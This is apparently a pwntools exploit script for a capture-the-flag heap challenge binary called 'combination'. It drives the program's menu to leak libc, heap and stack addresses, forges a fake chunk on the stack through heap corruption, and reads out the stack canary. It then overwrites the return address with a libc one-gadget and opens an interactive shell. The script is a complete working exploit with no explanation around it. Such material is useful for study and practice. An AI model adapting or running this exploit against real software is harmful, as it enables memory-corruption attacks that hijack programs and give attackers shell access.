from pwn import *

context.log_level='debug'

s=process('./combination')

def malloc(size,data):
	s.recvuntil('> ')
	s.sendline('1')
	s.recvuntil('Enter size : ')
	s.sendline(str(size))
	s.recvuntil('Enter data : ')
	s.sendline(data)

def free(num):
        s.recvuntil('> ')
        s.sendline('2')
	s.recvuntil('Which one do you want to free : ')
	s.sendline(str(num))	

def list(num,until=False):
	s.recvuntil('> ')
	s.sendline('3')
	s.recvuntil('Which chunk do you wanna see? ')
	s.sendline(str(num))
	
	if until is not False:
		s.recvuntil(until)

def modify(num, data):
	s.recvuntil('> ')
	s.sendline('4')
	s.recvuntil('Which chunk do you want to modify : ')
	s.sendline(str(num))
	s.recvuntil('Enter data : ')
	s.send(data)

def secret(size,data,until=False):
	s.recvuntil('> ')
	s.sendline('46')
	s.sendline(str(size))
	s.sendline(data)

	if until is not False:
		s.recvuntil(until)

if __name__ == "__main__":

	s=process('./combination')

	l=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	
	malloc(0xf8,'A'*0xf8) #chunk 1
	malloc(0xf8,'B'*0xf8) #chunk 2
	malloc(0xf8,'C'*0xf8) #chunk 3
	malloc(0xf8,'D'*0xf8) #chunk 4
	malloc(0xf8,'E'*0xf8) #chunk 5
	
	free(2) #to leak libc address
	list(2,'Data : ')	
	libc_leak=u64(s.recv(6).ljust(8,'\x00'))
	libc_base=libc_leak-0x3c4b78
	__free_hook=libc_base+l.symbols['__free_hook']

	free(4) #to leak heap address -> Use unsorted bins 
	malloc(0xf8,'L'*9) #chunk 6,2 
	
	list(2,'Data : '+'L'*8)
	
	heap_leak=u64(s.recv(6).ljust(8,'\x00'))
	heap_base=heap_leak-0x300-0x4c

	secret(100,'L'*0x20) #chunk 7 -> stack
		
	list(7,'Data : '+'L'*0x20)
	stack_leak=u64(s.recv(6).ljust(8,'\x00'))

	malloc(0xf8,'B'*0xf8) #chunk 8 
	malloc(0xf8,'D'*0xf8) #chunk 9
	malloc(0xf8,'D'*0xf8) #chunk 10
	malloc(0xf8,'D'*0xf8) #chunk 11
	
	fake_prevsize=((heap_base+0x700)-(stack_leak-0x170))&0xffffffffffffffff
	
	print hex(heap_base+0x400)
	print hex(stack_leak-0x170)

	fake_chunk= p64(0x100) #prev size
	fake_chunk+=p64(fake_prevsize) #size
	fake_chunk+=p64(stack_leak-0x170) #fd
	fake_chunk+=p64(stack_leak-0x170) #bk
        fake_chunk+=p64(stack_leak-0x170) #fd
        fake_chunk+=p64(stack_leak-0x170) #bk

	modify(10,'B'*0xf0+p64(fake_prevsize))	

	modify(7,fake_chunk+'\n') #unsorted bin <- stack addr
	free(11) # have to adjust topchunk free, to allocation malloc size after free()

	
	malloc(0x200,'S'*0x79) #chunk 12

	list(12,'Data : '+'S'*0x78)
	canary=u64(s.recv(8))-ord('S')

	print hex(canary)
	payload='S'*0x78+p64(canary)+p64(0x0)+p64(libc_base+0x4526a)
	modify(12,payload+'\x00'*(0x200-len(payload)))

	print "libc_base: "+str(hex(libc_base))
	print "__free_hook: "+str(hex(__free_hook))
	print "heap_base: "+str(hex(heap_base))
	print "stack_leak: "+str(hex(stack_leak))
	s.interactive()
